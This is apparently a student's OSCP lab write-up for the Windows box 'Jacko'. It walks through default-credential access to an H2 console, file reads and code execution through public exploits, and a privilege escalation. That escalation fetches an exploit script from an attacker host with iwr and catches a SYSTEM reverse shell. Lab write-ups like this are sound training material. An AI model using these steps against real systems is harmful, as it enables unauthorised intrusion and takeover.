...
![OSCP - Jacko - Windows - image1](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image1.png)
...
![OSCP - Jacko - Windows - image2](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image2.png)
- Attempted connection with default credentials `sa:` (No password) and accessed admin panel
![OSCP - Jacko - Windows - image3](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image3.png)
- Ran SQL query `SELECT FILE_READ('C:\Windows\system.ini', NULL);` to test file read ability
![OSCP - Jacko - Windows - image4](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image4.png)
 - ## Port 9092 - Unknown
- Navigated to `http://192.168.194.66:9092` and identified unknown service
![OSCP - Jacko - Windows - image5](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image5.png)
- Saved page and displayed with correct encoding
![OSCP - Jacko - Windows - image6](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image6.png)

---
# Exploitation
## SQL Injection
Ran `searchsploit "H2"` and identified exploit `49384.txt` to compile and run Java code on target for code execution
![OSCP - Jacko - Windows - image7](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image7.png)
- Copied Java script from exploit into SQL statement and ran
![OSCP - Jacko - Windows - image8](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image8.png)
- Copied native library script into SQL statement and ran
![OSCP - Jacko - Windows - image9](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image9.png)
- Copied script evaluation into SQL statement and ran with command `whoami` to test - identified user `jacko/tony`
![OSCP - Jacko - Windows - image10](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image10.png)
...
![OSCP - Jacko - Windows - image11](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image11.png)
...
![OSCP - Jacko - Windows - image12](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image12.png)
...
![OSCP - Jacko - Windows - image13](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image13.png)
---
# Lateral Movement to user
## Local Enumeration
- Ran `type C:\Users\tony\desktop\local.txt` to print `988d8a67a549358c69a1cab88b594883`
![OSCP - Jacko - Windows - image14](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image14.png)
- Navigated to `C:\Windows\system32` and ran `whoami /priv` - identified `SeImpersonatePrivilege` is `Enabled`
![OSCP - Jacko - Windows - image15](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image15.png)
- Ran `systeminfo` and identified `Windows 10 Build 18363` on `x64` architecture
![OSCP - Jacko - Windows - image16](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image16.png)
- Ran `set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;` to fix error with file path
![OSCP - Jacko - Windows - image17](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image17.png)
...
![OSCP - Jacko - Windows - image18](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image18.png)
- Ran `searchsploit "Paperstream"` - identified & copied exploit `49382.ps1`
![OSCP - Jacko - Windows - image19](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image19.png)
- Updated `49382.ps1` to save `shell.dll` to `C:\Users\tony\`
![OSCP - Jacko - Windows - image20](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image20.png)
...
![OSCP - Jacko - Windows - image21](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image21.png)
- Started netcat listener and ran `.\paperstreamexploit.ps1` - payload triggered but no reverse shell received
![OSCP - Jacko - Windows - image22](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image22.png)
...
![OSCP - Jacko - Windows - image23](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image23.png)
...
![OSCP - Jacko - Windows - image24](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image24.png)
- Ran `iwr -uri http://192.168.45.169/49382.ps1 -outfile 49382.ps1` to copy `49382.ps1` onto target (via python3 http server)
![OSCP - Jacko - Windows - image25](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image25.png)
- Started netcat listener on port `445` and then ran `.\49382.ps1` to execute exploit - received shell as `NT-System`
![OSCP - Jacko - Windows - image26](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image26.png)
![OSCP - Jacko - Windows - image27](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image27.png)
- Ran `type C:\Users\administrator\desktop\proof.txt` to print `b32d47218e9665058f06833a497a4154`
![OSCP - Jacko - Windows - image28](/files/OSCP%20-%20Jacko%20-%20Windows%20-%20image28.png)
---
# Trophy & Loot
